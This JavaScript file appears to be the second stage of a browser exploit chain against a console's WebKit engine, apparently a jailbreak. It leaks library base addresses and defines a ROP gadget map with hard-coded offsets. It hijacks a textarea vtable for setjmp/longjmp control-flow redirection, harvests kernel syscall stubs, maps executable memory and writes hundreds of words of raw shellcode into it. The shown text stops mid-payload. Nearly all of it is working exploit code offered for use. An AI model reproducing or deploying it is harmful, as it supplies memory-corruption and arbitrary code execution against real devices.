var p;
var chain;
var nogc = [];
var webKitBase;
var libSceLibcInternalBase;
var libKernelBase;

const OFFSET_WK_vtable_first_element    = 0x009A6040;
const OFFSET_WK_memset_import           = 0x00002458;
const OFFSET_WK___stack_chk_fail_import = 0x00002438;
const OFFSET_WK_setjmp_gadget_one       = 0x006D81F5;
const OFFSET_WK_setjmp_gadget_two       = 0x00288F83;
const OFFSET_WK_longjmp_gadget_one      = 0x006D81F5;
const OFFSET_WK_longjmp_gadget_two      = 0x00288F83;



const OFFSET_libcint_memset             = 0x000507D0;
const OFFSET_libcint_setjmp             = 0x000BE39C;
const OFFSET_libcint_longjmp            = 0x000BE3F6;

const OFFSET_lk___stack_chk_fail        = 0x00012AD0;
const OFFSET_lk_pthread_create_name_np  = 0x0001BB10;
const OFFSET_lk_pthread_exit            = 0x00019FD0;
const OFFSET_lk_pthread_self            = 0x0001D160;
const OFFSET_lk_pthread_setschedparam   = 0x0002AD70;

var syscalls = {};
var gadgets = {};
var gadgetmap = {
  "ret": 0x0000003C,
  "pop rdi": 0x0000835D,
  "pop rsi": 0x0003C987,
  "pop rdx": 0x00052B23,
  "pop rcx": 0x00026AFB,
  "pop r8": 0x00097D32,
  "pop r9": 0x005C6A81,
  "pop rax": 0x0001FA68,
  "pop rsp": 0x00078C62,

  "mov [rdi], rax": 0x000203E9,
  "mov [rdi], eax": 0x00020148,
  "mov [rdi], rsi": 0x000359F0,
  "cmp [rcx], edi": 0x0010DA31,

  "setne al": 0x00009000,
  "sete al": 0x0001E0C4,
  "setle al": 0x000CA7F6,
  "setl al": 0x005955AC,
  "setge al": 0x0061B262,
  "setg al": 0x000E4A37,
  "shl rax, 3": 0x005E8953,
  "add rax, rdx": 0x003D498C,
  "mov rax, [rax]": 0x0002E852,
  "inc dword [rax]": 0x003628DB,
  "infpoop": 0x0001386A
};

var textArea = document.createElement("textarea");

function stage2() {
  p = window.prim;
  p.launch_chain = launch_chain;
  p.malloc = malloc;
  p.malloc32 = malloc32;
  p.stringify = stringify;
  p.readString = readString;
  p.array_from_address = array_from_address;

  //pointer to vtable address
  var textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
  //address of vtable
  var textAreaVtable = p.read8(textAreaVtPtr);
  //use address of 1st entry (in .text) to calculate webkitbase
  webKitBase = p.read8(textAreaVtable).sub32(OFFSET_WK_vtable_first_element);

  libSceLibcInternalBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_memset_import)));
  libSceLibcInternalBase.sub32inplace(OFFSET_libcint_memset);

  libKernelBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK___stack_chk_fail_import)));
  libKernelBase.sub32inplace(OFFSET_lk___stack_chk_fail);

  for (var gadget in gadgetmap) {
    window.gadgets[gadget] = webKitBase.add32(gadgetmap[gadget]);
  }

  function get_jmptgt(address) {
    var instr = p.read4(address) & 0xFFFF;
    var offset = p.read4(address.add32(2));
    if (instr != 0x25FF) {
      return 0;
    }
    return address.add32(0x6 + offset);
  }

  function malloc(sz) {
    var backing = new Uint8Array(0x10000 + sz);
    window.nogc.push(backing);
    var ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = backing;
    return ptr;
  }

  function malloc32(sz) {
    var backing = new Uint8Array(0x10000 + sz * 4);
    window.nogc.push(backing);
    var ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = new Uint32Array(backing.buffer);
    return ptr;
  }

  function array_from_address(addr, size) {
    var og_array = new Uint32Array(0x1000);
    var og_array_i = p.leakval(og_array).add32(0x10);

    p.write8(og_array_i, addr);
    p.write4(og_array_i.add32(8), size);

    nogc.push(og_array);
    return og_array;
  }

  function stringify(str) {
    var bufView = new Uint8Array(str.length + 1);
    for (var i = 0; i < str.length; i++) {
      bufView[i] = str.charCodeAt(i) & 0xFF;
    }
    window.nogc.push(bufView);
    return p.read8(p.leakval(bufView).add32(0x10));
  }
  function readString(addr)
  {
    var byte = p.read4(addr);
    var str  = "";
    var i = 0;
    while (byte & 0xFF)
    {
      str += String.fromCharCode(byte & 0xFF);
      byte = p.read4(addr.add32(i));
      i++;
    }
    return str;
  }



  var fakeVtable_setjmp = p.malloc32(0x200);
  var fakeVtable_longjmp = p.malloc32(0x200);
  var original_context = p.malloc32(0x40);
  var modified_context = p.malloc32(0x40);

  p.write8(fakeVtable_setjmp.add32(0x0), fakeVtable_setjmp);
  p.write8(fakeVtable_setjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_setjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
  p.write8(fakeVtable_setjmp.add32(0x10), original_context);
  p.write8(fakeVtable_setjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_setjmp));
  p.write8(fakeVtable_setjmp.add32(0x1D8), webKitBase.add32(OFFSET_WK_setjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]

  p.write8(fakeVtable_longjmp.add32(0x0), fakeVtable_longjmp);
  p.write8(fakeVtable_longjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_longjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
  p.write8(fakeVtable_longjmp.add32(0x10), modified_context);
  p.write8(fakeVtable_longjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
  p.write8(fakeVtable_longjmp.add32(0x1D8), webKitBase.add32(OFFSET_WK_longjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]

  function launch_chain(chain) {

    chain.push(window.gadgets["pop rdi"]);
    chain.push(original_context);
    chain.push(libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));

    p.write8(textAreaVtPtr, fakeVtable_setjmp);
    textArea.scrollLeft = 0x0;
    p.write8(modified_context.add32(0x00), window.gadgets["ret"]);
    p.write8(modified_context.add32(0x10), chain.stack);
    p.write8(modified_context.add32(0x40), p.read8(original_context.add32(0x40)))

    p.write8(textAreaVtPtr, fakeVtable_longjmp);
    textArea.scrollLeft = 0x0;
    p.write8(textAreaVtPtr, textAreaVtable);
  }

  var kview = new Uint8Array(0x1000);
  var kstr = p.leakval(kview).add32(0x10);
  var orig_kview_buf = p.read8(kstr);

  p.write8(kstr, window.libKernelBase);
  p.write4(kstr.add32(8), 0x40000);
  var countbytes;

  for (var i = 0; i < 0x40000; i++) {
    if (kview[i] == 0x72 && kview[i + 1] == 0x64 && kview[i + 2] == 0x6c && kview[i + 3] == 0x6f && kview[i + 4] == 0x63) {
      countbytes = i;
      break;
    }
  }
  p.write4(kstr.add32(8), countbytes + 32);
  var dview32 = new Uint32Array(1);
  var dview8 = new Uint8Array(dview32.buffer);
  for (var i = 0; i < countbytes; i++) {
    if (kview[i] == 0x48 && kview[i + 1] == 0xc7 && kview[i + 2] == 0xc0 && kview[i + 7] == 0x49 && kview[i + 8] == 0x89 && kview[i + 9] == 0xca && kview[i + 10] == 0x0f && kview[i + 11] == 0x05) {
      dview8[0] = kview[i + 3];
      dview8[1] = kview[i + 4];
      dview8[2] = kview[i + 5];
      dview8[3] = kview[i + 6];
      var syscallno = dview32[0];
      window.syscalls[syscallno] = window.libKernelBase.add32(i);
    }
  }
  p.write8(kstr, orig_kview_buf);
  chain = new rop();
  if (chain.syscall(23, 0).low != 0x0) {
    try {
      stage3();
    } catch (e) {
      alert(e);
    }
  } 
    
  var payload_buffer = chain.syscall(477, new int64(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
  var payload_writer = p.array_from_address(payload_buffer, 0xC0000);

  payload_writer[0] = 0x0034b4e9;
  payload_writer[1] = 0x50535500;
  payload_writer[2] = 0x091d8b48;
  payload_writer[3] = 0x4800005d;
  payload_writer[4] = 0x8d48fd89;
  payload_writer[5] = 0x004b273d;
  payload_writer[6] = 0x8115ff00;
  payload_writer[7] = 0x8b00005f;
  payload_writer[8] = 0xc931107d;
  payload_writer[9] = 0x89485841;
  payload_writer[10] = 0xd88948c2;
  payload_writer[11] = 0x8d485d5b;
  payload_writer[12] = 0x004b0b35;
  payload_writer[13] = 0x55e0ff00;
  payload_writer[14] = 0x8b485053;
  payload_writer[15] = 0x005cd71d;
  payload_writer[16] = 0xfd894800;
  payload_writer[17] = 0x0b3d8d48;
  payload_writer[18] = 0xff00004b;
  payload_writer[19] = 0x005f4f15;
  payload_writer[20] = 0x107d8b00;
  payload_writer[21] = 0x5841c931;
  payload_writer[22] = 0x48c28948;
  payload_writer[23] = 0x5d5bd889;
  payload_writer[24] = 0xef358d48;
  payload_writer[25] = 0xff00004a;
  payload_writer[26] = 0x505355e0;
  payload_writer[27] = 0xa51d8b48;
  payload_writer[28] = 0x4800005c;
  payload_writer[29] = 0x8d48fd89;
  payload_writer[30] = 0x004b003d;
  payload_writer[31] = 0x1d15ff00;
  payload_writer[32] = 0x8b00005f;
  payload_writer[33] = 0xc931107d;
  payload_writer[34] = 0x89485841;
  payload_writer[35] = 0xd88948c2;
  payload_writer[36] = 0x8d485d5b;
  payload_writer[37] = 0x004ae435;
  payload_writer[38] = 0x55e0ff00;
  payload_writer[39] = 0x8b485053;
  payload_writer[40] = 0x005c731d;
  payload_writer[41] = 0xfd894800;
  payload_writer[42] = 0xe43d8d48;
  payload_writer[43] = 0xff00004a;
  payload_writer[44] = 0x005eeb15;
  payload_writer[45] = 0x107d8b00;
  payload_writer[46] = 0x5841c931;
  payload_writer[47] = 0x48c28948;
  payload_writer[48] = 0x5d5bd889;
  payload_writer[49] = 0xc8358d48;
  payload_writer[50] = 0xff00004a;
  payload_writer[51] = 0x505355e0;
  payload_writer[52] = 0x411d8b48;
  payload_writer[53] = 0x4800005c;
  payload_writer[54] = 0x8d48fd89;
  payload_writer[55] = 0x004acb3d;
  payload_writer[56] = 0xb915ff00;
  payload_writer[57] = 0x8b00005e;
  payload_writer[58] = 0xc931107d;
  payload_writer[59] = 0x89485841;
  payload_writer[60] = 0xd88948c2;
  payload_writer[61] = 0x8d485d5b;
  payload_writer[62] = 0x004aaf35;
  payload_writer[63] = 0x41e0ff00;
  payload_writer[64] = 0x48535554;
  payload_writer[65] = 0x4ab6358d;
  payload_writer[66] = 0x81480000;
  payload_writer[67] = 0x000260ec;
  payload_writer[68] = 0x48178b00;
  payload_writer[69] = 0x20246c8d;
  payload_writer[70] = 0x31fb8948;
  payload_writer[71] = 0xef8948c0;
  payload_writer[72] = 0x5e4215ff;
  payload_writer[73] = 0xc9310000;
  payload_writer[74] = 0x000001ba;
  payload_writer[75] = 0x0002be00;
  payload_writer[76] = 0x89480000;
  payload_writer[77] = 0xbd15ffef;
  payload_writer[78] = 0xc600005b;
  payload_writer[79] = 0x31101c43;
  payload_writer[80] = 0x144389ff;
  payload_writer[81] = 0x246c8d48;
  payload_writer[82] = 0x1d43c660;
  payload_writer[83] = 0xcd15ff02;
  payload_writer[84] = 0x3100005b;
  payload_writer[85] = 0x204389ff;
  payload_writer[86] = 0x5bb215ff;
  payload_writer[87] = 0x7b8b0000;
  payload_writer[88] = 0x738d4814;
  payload_writer[89] = 0x4389661c;
  payload_writer[90] = 0x0010ba1e;
  payload_writer[91] = 0x15ff0000;
  payload_writer[92] = 0x00005bcc;
  payload_writer[93] = 0xbe147b8b;
  payload_writer[94] = 0x00000080;
  payload_writer[95] = 0x5bde15ff;
  payload_writer[96] = 0x44c70000;
  payload_writer[97] = 0x00100c24;
  payload_writer[98] = 0x7b8b0000;
  payload_writer[99] = 0x548d4814;
  payload_writer[100] = 0x8d480c24;
  payload_writer[101] = 0xff102474;
  payload_writer[102] = 0x005b6b15;
  payload_writer[103] = 0x748b6600;
  payload_writer[104] = 0x058b1224;
  payload_writer[105] = 0x00005e44;
  payload_writer[106] = 0x40f28948;
  payload_writer[107] = 0x41f6b60f;
  payload_writer[108] = 0x0f44c089;
  payload_writer[109] = 0xb60fd0b6;
  payload_writer[110] = 0xfeb60fcc;
  payload_writer[111] = 0x4118e8c1;
  payload_writer[112] = 0x5710e8c1;
  payload_writer[113] = 0x56c18941;
  payload_writer[114] = 0x45d28944;
  payload_writer[115] = 0x48c0b60f;
  payload_writer[116] = 0x4a06358d;
  payload_writer[117] = 0x89480000;
  payload_writer[118] = 0xffc031ef;
  payload_writer[119] = 0x005d8715;
  payload_writer[120] = 0x258b4c00;
  payload_writer[121] = 0x00005b30;
  payload_writer[122] = 0xffef8948;
  payload_writer[123] = 0x005daf15;
  payload_writer[124] = 0x107b8b00;
  payload_writer[125] = 0x31ee8948;
  payload_writer[126] = 0xc28948c9;
  payload_writer[127] = 0xc7d4ff41;
  payload_writer[128] = 0x00021843;
  payload_writer[129] = 0x81480000;
  payload_writer[130] = 0x000270c4;
  payload_writer[131] = 0x415d5b00;
  payload_writer[132] = 0x5441c35c;
  payload_writer[133] = 0x89485355;
  payload_writer[134] = 0xec8348fb;
  payload_writer[135] = 0xbf8b4860;
  payload_writer[136] = 0x00000258;
  payload_writer[137] = 0x74ff8548;
  payload_writer[138] = 0x448d4833;
  payload_writer[139] = 0x8d480724;
  payload_writer[140] = 0x500c2454;
  payload_writer[141] = 0x014a8d48;
  payload_writer[142] = 0x24448d48;
  payload_writer[143] = 0x4a8d4c0e;
  payload_writer[144] = 0x8d4c5003;
  payload_writer[145] = 0xc0310242;
  payload_writer[146] = 0xf3358d48;
  payload_writer[147] = 0xff000049;
  payload_writer[148] = 0x005c8315;
  payload_writer[149] = 0xf8835a00;
  payload_writer[150] = 0x28745906;
  payload_writer[151] = 0xb53d8d48;
  payload_writer[152] = 0x48000049;
  payload_writer[153] = 0x5aae2d8b;
  payload_writer[154] = 0x15ff0000;
  payload_writer[155] = 0x00005d30;
  payload_writer[156] = 0x31107b8b;
  payload_writer[157] = 0xc28948c9;
  payload_writer[158] = 0x99358d48;
  payload_writer[159] = 0xe9000049;
  payload_writer[160] = 0x000000c6;
  payload_writer[161] = 0x246cb60f;
  payload_writer[162] = 0x648d4c06;
  payload_writer[163] = 0xb60f1024;
  payload_writer[164] = 0x4807247c;
  payload_writer[165] = 0x49c6358d;
  payload_writer[166] = 0x0f440000;
  payload_writer[167] = 0x0f244cb6;
  payload_writer[168] = 0x0f44c031;
  payload_writer[169] = 0x0e2444b6;
  payload_writer[170] = 0x244cb60f;
  payload_writer[171] = 0x08e5c10d;
  payload_writer[172] = 0x2454b60f;
  payload_writer[173] = 0x4cfd010c;
  payload_writer[174] = 0x15ffe789;
  payload_writer[175] = 0x00005ca8;
  payload_writer[176] = 0x48e6894c;
  payload_writer[177] = 0x0824548d;
  payload_writer[178] = 0x000002bf;
  payload_writer[179] = 0x648d4c00;
  payload_writer[180] = 0x15ff2024;
  payload_writer[181] = 0x00005a28;
  payload_writer[182] = 0x8d48138b;
  payload_writer[183] = 0x0048df35;
  payload_writer[184] = 0xe7894c00;
  payload_writer[185] = 0x15ffc031;
  payload_writer[186] = 0x00005c7c;
  payload_writer[187] = 0x01bac931;
  payload_writer[188] = 0xbe000000;
  payload_writer[189] = 0x00000002;
  payload_writer[190] = 0xffe7894c;
  payload_writer[191] = 0x0059f715;
  payload_writer[192] = 0x1c43c600;
  payload_writer[193] = 0xfdb70f10;
  payload_writer[194] = 0x8b144389;
  payload_writer[195] = 0xc6082444;
  payload_writer[196] = 0x89021d43;
  payload_writer[197] = 0x15ff2043;
  payload_writer[198] = 0x000059f4;
  payload_writer[199] = 0x011843c7;
  payload_writer[200] = 0x48000000;
  payload_writer[201] = 0x49423d8d;
  payload_writer[202] = 0x89660000;
  payload_writer[203] = 0x8b481e43;
  payload_writer[204] = 0x0059e32d;
  payload_writer[205] = 0x6515ff00;
  payload_writer[206] = 0x8b00005c;
  payload_writer[207] = 0xc931107b;
  payload_writer[208] = 0x48c28948;
  payload_writer[209] = 0x4922358d;
  payload_writer[210] = 0xd5ff0000;
  payload_writer[211] = 0x60c48348;
  payload_writer[212] = 0x5c415d5b;
  payload_writer[213] = 0x894853c3;
  payload_writer[214] = 0x147f8bfb;
  payload_writer[215] = 0x59ce15ff;
  payload_writer[216] = 0x7b830000;
  payload_writer[217] = 0x09750218;
  payload_writer[218] = 0xff3c7b8b;
  payload_writer[219] = 0x0059bf15;
  payload_writer[220] = 0x1843c700;
  payload_writer[221] = 0x00000000;
  payload_writer[222] = 0x8166c35b;
  payload_writer[223] = 0xb0f000e7;
  payload_writer[224] = 0xff816662;
  payload_writer[225] = 0x39746000;
  payload_writer[226] = 0x00ff8166;
  payload_writer[227] = 0x7463b020;
  payload_writer[228] = 0xff816630;
  payload_writer[229] = 0x2db08000;
  payload_writer[230] = 0x81662774;
  payload_writer[231] = 0xb04000ff;
  payload_writer[232] = 0x661e7464;
  payload_writer[233] = 0x1000ff81;
  payload_writer[234] = 0x157470b0;
  payload_writer[235] = 0x00ff8166;
  payload_writer[236] = 0x7473b0c0;
  payload_writer[237] = 0xff81660c;
  payload_writer[238] = 0x20b2a000;
  payload_writer[239] = 0x450f6cb0;
  payload_writer[240] = 0x5441c3c2;
  payload_writer[241] = 0x8d485355;
  payload_writer[242] = 0x0002608f;
  payload_writer[243] = 0xec814800;
  payload_writer[244] = 0x00000100;
  payload_writer[245] = 0x48fd8948;
  payload_writer[246] = 0x01245c8d;
  payload_writer[247] = 0xa8158d48;
  payload_writer[248] = 0xbe000048;
  payload_writer[249] = 0x000000ff;
  payload_writer[250] = 0x31df8948;
  payload_writer[251] = 0x1515ffc0;
  payload_writer[252] = 0x4c00005a;
  payload_writer[253] = 0x591e258b;
  payload_writer[254] = 0x89480000;
  payload_writer[255] = 0x9d15ffdf;
  payload_writer[256] = 0x8b00005b;
  payload_writer[257] = 0x8948107d;
  payload_writer[258] = 0x48c931de;
  payload_writer[259] = 0xff41c289;
  payload_writer[260] = 0xc48148d4;
  payload_writer[261] = 0x00000100;
  payload_writer[262] = 0x5c415d5b;
  payload_writer[263] = 0x485355c3;
  payload_writer[264] = 0x4818ec83;
  payload_writer[265] = 0x8b48fb89;
  payload_writer[266] = 0x000258bf;
  payload_writer[267] = 0xff854800;
  payload_writer[268] = 0xc0315e74;
  payload_writer[269] = 0x244c8d48;
  payload_writer[270] = 0x548d4808;
  payload_writer[271] = 0x8d480724;
  payload_writer[272] = 0x00486b35;
  payload_writer[273] = 0x8d15ff00;
  payload_writer[274] = 0x8500005a;
  payload_writer[275] = 0x8a417ec0;
  payload_writer[276] = 0x48072454;
  payload_writer[277] = 0x58be2d8b;
  payload_writer[278] = 0x8b480000;
  payload_writer[279] = 0x005b3f05;
  payload_writer[280] = 0x41fa8000;
  payload_writer[281] = 0xfa800574;
  payload_writer[282] = 0x481a7549;
  payload_writer[283] = 0x48443d8d;
  payload_writer[284] = 0xd0ff0000;
  payload_writer[285] = 0x31107b8b;
  payload_writer[286] = 0xc28948c9;
  payload_writer[287] = 0x33358d48;
  payload_writer[288] = 0xeb000048;
  payload_writer[289] = 0x3d8d482e;
  payload_writer[290] = 0x00004835;
  payload_writer[291] = 0x14ebd0ff;
  payload_writer[292] = 0x812d8b48;
  payload_writer[293] = 0x48000058;
  payload_writer[294] = 0x48233d8d;
  payload_writer[295] = 0x15ff0000;
  payload_writer[296] = 0x00005afc;
  payload_writer[297] = 0x31107b8b;
  payload_writer[298] = 0xc28948c9;
  payload_writer[299] = 0x0e358d48;
  payload_writer[300] = 0xff000048;
  payload_writer[301] = 0xc48348d5;
  payload_writer[302] = 0xc35d5b18;
  payload_writer[303] = 0x53555441;
  payload_writer[304] = 0x48fb8948;
  payload_writer[305] = 0x4840ec83;
  payload_writer[306] = 0x0470978d;
  payload_writer[307] = 0x8d480000;
  payload_writer[308] = 0x00480935;
  payload_writer[309] = 0x7f8d4800;
  payload_writer[310] = 0xffc03154;
  payload_writer[311] = 0x0059f715;
  payload_writer[312] = 0x70938b00;
  payload_writer[313] = 0x48000004;
  payload_writer[314] = 0x47fa358d;
  payload_writer[315] = 0x89480000;
  payload_writer[316] = 0xffc031e7;
  payload_writer[317] = 0x005a6f15;
  payload_writer[318] = 0x258b4c00;
  payload_writer[319] = 0x00005818;
  payload_writer[320] = 0xffe78948;
  payload_writer[321] = 0x005a9715;
  payload_writer[322] = 0x107b8b00;
  payload_writer[323] = 0x31e68948;
  payload_writer[324] = 0xc28948c9;
  payload_writer[325] = 0x48d4ff41;
  payload_writer[326] = 0x5b40c483;
  payload_writer[327] = 0xc35c415d;
  payload_writer[328] = 0x89485355;
  payload_writer[329] = 0x8d4850fb;
  payload_writer[330] = 0x0047d03d;
  payload_writer[331] = 0x2d8b4800;
  payload_writer[332] = 0x000057e4;
  payload_writer[333] = 0x5a6615ff;
  payload_writer[334] = 0x7b8b0000;
  payload_writer[335] = 0x48c93110;
  payload_writer[336] = 0x8d48c289;
  payload_writer[337] = 0x0047b435;
  payload_writer[338] = 0x48d5ff00;
  payload_writer[339] = 0x57c62d8b;
  payload_writer[340] = 0x8d480000;
  payload_writer[341] = 0x0047b53d;
  payload_writer[342] = 0x4115ff00;
  payload_writer[343] = 0x8b00005a;
  payload_writer[344] = 0xc931107b;
  payload_writer[345] = 0x48c28948;
  payload_writer[346] = 0x47a0358d;
  payload_writer[347] = 0xd5ff0000;
  payload_writer[348] = 0xa12d8b48;
  payload_writer[349] = 0x48000057;
  payload_writer[350] = 0x479e3d8d;
  payload_writer[351] = 0x15ff0000;
  payload_writer[352] = 0x00005a1c;
  payload_writer[353] = 0x31107b8b;
  payload_writer[354] = 0x485841c9;
  payload_writer[355] = 0x485bc289;
  payload_writer[356] = 0x485de889;
  payload_writer[357] = 0x4782358d;
  payload_writer[358] = 0xe0ff0000;
  payload_writer[359] = 0xfb894853;
  payload_writer[360] = 0x213d8d48;
  payload_writer[361] = 0xff00005a;
  payload_writer[362] = 0x00583b15;
  payload_writer[363] = 0x938b4800;
  payload_writer[364] = 0x00000468;
  payload_writer[365] = 0x74d28548;
  payload_writer[366] = 0x838b480e;
  payload_writer[367] = 0x00000460;
  payload_writer[368] = 0x60828948;
  payload_writer[369] = 0x48000004;
  payload_writer[370] = 0x0460838b;
  payload_writer[371] = 0x85480000;
  payload_writer[372] = 0x480774c0;
  payload_writer[373] = 0x04689089;
  payload_writer[374] = 0x3b480000;
  payload_writer[375] = 0x0059ef1d;
  payload_writer[376] = 0x48077500;
  payload_writer[377] = 0x59e60589;
  payload_writer[378] = 0x0dff0000;
  payload_writer[379] = 0x000059e8;
  payload_writer[380] = 0xd13d8d48;
  payload_writer[381] = 0x5b000059;
  payload_writer[382] = 0x57ca25ff;
  payload_writer[383] = 0x56410000;
  payload_writer[384] = 0x54415541;
  payload_writer[385] = 0x89485355;
  payload_writer[386] = 0xec8348fb;
  payload_writer[387] = 0x3d8d4810;
  payload_writer[388] = 0x00004712;
  payload_writer[389] = 0xfd2d8b48;
  payload_writer[390] = 0x49000056;
  payload_writer[391] = 0x15ffe589;
  payload_writer[392] = 0x0000597c;
  payload_writer[393] = 0x31107b8b;
  payload_writer[394] = 0xc28948c9;
  payload_writer[395] = 0xf3358d48;
  payload_writer[396] = 0xff000046;
  payload_writer[397] = 0x6b8d48d5;
  payload_writer[398] = 0xbaf63154;
  payload_writer[399] = 0x00000200;
  payload_writer[400] = 0xffef8948;
  payload_writer[401] = 0x0058d715;
  payload_writer[402] = 0x107b8b00;
  payload_writer[403] = 0x00bac931;
  payload_writer[404] = 0x48000002;
  payload_writer[405] = 0x15ffee89;
  payload_writer[406] = 0x000056dc;
  payload_writer[407] = 0x4389c085;
  payload_writer[408] = 0xbf8e0f50;
  payload_writer[409] = 0x4c000000;
  payload_writer[410] = 0x8d48ea89;
  payload_writer[411] = 0x00464235;
  payload_writer[412] = 0xef894800;
  payload_writer[413] = 0x15ffc031;
  payload_writer[414] = 0x0000585c;
  payload_writer[415] = 0x000020be;
  payload_writer[416] = 0xef894800;
  payload_writer[417] = 0x591e15ff;
  payload_writer[418] = 0x85480000;
  payload_writer[419] = 0x480d75c0;
  payload_writer[420] = 0x025883c7;
  payload_writer[421] = 0x00000000;
  payload_writer[422] = 0x0aeb0000;
  payload_writer[423] = 0x48c0ff48;
  payload_writer[424] = 0x02588389;
  payload_writer[425] = 0xe8bf0000;
  payload_writer[426] = 0x4c000003;
  payload_writer[427] = 0x594e258d;
  payload_writer[428] = 0x15ff0000;
  payload_writer[429] = 0x00005598;
  payload_writer[430] = 0x894ded31;
  payload_writer[431] = 0x7c8341e6;
  payload_writer[432] = 0x74001024;
  payload_writer[433] = 0x348b492c;
  payload_writer[434] = 0xef894c24;
  payload_writer[435] = 0x587e15ff;
  payload_writer[436] = 0xc0850000;
  payload_writer[437] = 0x63481b75;
  payload_writer[438] = 0xed6b48ed;
  payload_writer[439] = 0x448b4918;
  payload_writer[440] = 0x8548082e;
  payload_writer[441] = 0x481574c0;
  payload_writer[442] = 0xd0ffdf89;
  payload_writer[443] = 0xffff44e9;
  payload_writer[444] = 0x49c5ffff;
  payload_writer[445] = 0x8318c483;
  payload_writer[446] = 0xc17520fd;
  payload_writer[447] = 0x152d8b48;
  payload_writer[448] = 0x48000056;
  payload_writer[449] = 0x46363d8d;
  payload_writer[450] = 0x15ff0000;
  payload_writer[451] = 0x00005890;
  payload_writer[452] = 0x31107b8b;
  payload_writer[453] = 0xc28948c9;
  payload_writer[454] = 0x21358d48;
  payload_writer[455] = 0xff000046;
  payload_writer[456] = 0xff0fe9d5;
  payload_writer[457] = 0x043dffff;
  payload_writer[458] = 0x74804101;
  payload_writer[459] = 0xdf894808;
  payload_writer[460] = 0xfffe67e8;
  payload_writer[461] = 0x107b8bff;
  payload_writer[462] = 0x55f215ff;
  payload_writer[463] = 0x7b830000;
  payload_writer[464] = 0x18740018;
  payload_writer[465] = 0xff147b8b;
  payload_writer[466] = 0x0055e315;
  payload_writer[467] = 0x187b8300;
  payload_writer[468] = 0x8b097502;
  payload_writer[469] = 0x15ff3c7b;
  payload_writer[470] = 0x000055d4;
  payload_writer[471] = 0xffdf8948;
  payload_writer[472] = 0x00585b15;
  payload_writer[473] = 0xffff3100;
  payload_writer[474] = 0x00564315;
  payload_writer[475] = 0xc4834800;
  payload_writer[476] = 0x5bc03110;
  payload_writer[477] = 0x415c415d;
  payload_writer[478] = 0xc35e415d;
  payload_writer[479] = 0x56415741;
  payload_writer[480] = 0x54415541;
  payload_writer[481] = 0x81485355;
  payload_writer[482] = 0x000098ec;
  payload_writer[483] = 0xbac93100;
  payload_writer[484] = 0x00000001;
  payload_writer[485] = 0x000002be;
  payload_writer[486] = 0x3d8d4800;
  payload_writer[487] = 0x000045c9;
  payload_writer[488] = 0x246c8d48;
  payload_writer[489] = 0x4d15ff30;
  payload_writer[490] = 0xc7000055;
  payload_writer[491] = 0x01182444;
  payload_writer[492] = 0x48000000;
  payload_writer[493] = 0x18244c8d;
  payload_writer[494] = 0x0004b841;
  payload_writer[495] = 0x04ba0000;
  payload_writer[496] = 0xbe000000;
  payload_writer[497] = 0x0000ffff;
  payload_writer[498] = 0x0589c789;
  payload_writer[499] = 0x0000580c;
  payload_writer[500] = 0x24648d4c;
  payload_writer[501] = 0x4d15ff1c;
  payload_writer[502] = 0xc6000055;
  payload_writer[503] = 0x10202444;
  payload_writer[504] = 0x44c6ff31;
  payload_writer[505] = 0x4c022124;
  payload_writer[506] = 0x40246c8d;
  payload_writer[507] = 0x552e15ff;
  payload_writer[508] = 0xb70f0000;
  payload_writer[509] = 0x0057ef3d;
  payload_writer[510] = 0x758d4c00;
  payload_writer[511] = 0x24448904;
  payload_writer[512] = 0x0915ff24;
  payload_writer[513] = 0x8b000055;
  payload_writer[514] = 0x0057cf3d;
  payload_writer[515] = 0x748d4800;
  payload_writer[516] = 0x89662024;
  payload_writer[517] = 0xba222444;
  payload_writer[518] = 0x00000010;
  payload_writer[519] = 0x551e15ff;
  payload_writer[520] = 0x3d8b0000;
  payload_writer[521] = 0x000057b4;
  payload_writer[522] = 0x000080be;
  payload_writer[523] = 0x2d15ff00;
  payload_writer[524] = 0xc7000055;
  payload_writer[525] = 0x101c2444;
  payload_writer[526] = 0x8b000000;
  payload_writer[527] = 0x00579b3d;
  payload_writer[528] = 0xe2894c00;
  payload_writer[529] = 0xffee8948;
  payload_writer[530] = 0x00552b15;
  payload_writer[531] = 0x41c08500;
  payload_writer[532] = 0x880fc789;
  payload_writer[533] = 0x0000011a;
  payload_writer[534] = 0x000010b9;
  payload_writer[535] = 0xea894c00;
  payload_writer[536] = 0xbff6894c;
  payload_writer[537] = 0x00000002;
  payload_writer[538] = 0x548215ff;
  payload_writer[539] = 0x78bf0000;
  payload_writer[540] = 0xff000004;
  payload_writer[541] = 0x0055af15;
  payload_writer[542] = 0x358d4800;
  payload_writer[543] = 0x000044fb;
  payload_writer[544] = 0x8bc38948;
  payload_writer[545] = 0x00574f05;
  payload_writer[546] = 0x7b894400;
  payload_writer[547] = 0x1843c710;
  payload_writer[548] = 0x00000000;
  payload_writer[549] = 0x60bb8d48;
  payload_writer[550] = 0x89000002;
  payload_writer[551] = 0x4d15ff03;
  payload_writer[552] = 0x48000055;
  payload_writer[553] = 0xba407b8d;
  payload_writer[554] = 0x00000010;
  payload_writer[555] = 0xffee8948;
  payload_writer[556] = 0x00555b15;
  payload_writer[557] = 0x3d8d4800;
  payload_writer[558] = 0x0000570c;
  payload_writer[559] = 0x552615ff;
  payload_writer[560] = 0x8b480000;
  payload_writer[561] = 0x00570705;
  payload_writer[562] = 0xc0854800;
  payload_writer[563] = 0x89481f75;
  payload_writer[564] = 0x0056fb1d;
  payload_writer[565] = 0x83c74800;
  payload_writer[566] = 0x00000468;
  payload_writer[567] = 0x00000000;
  payload_writer[568] = 0x6083c748;
  payload_writer[569] = 0x00000004;
  payload_writer[570] = 0xeb000000;
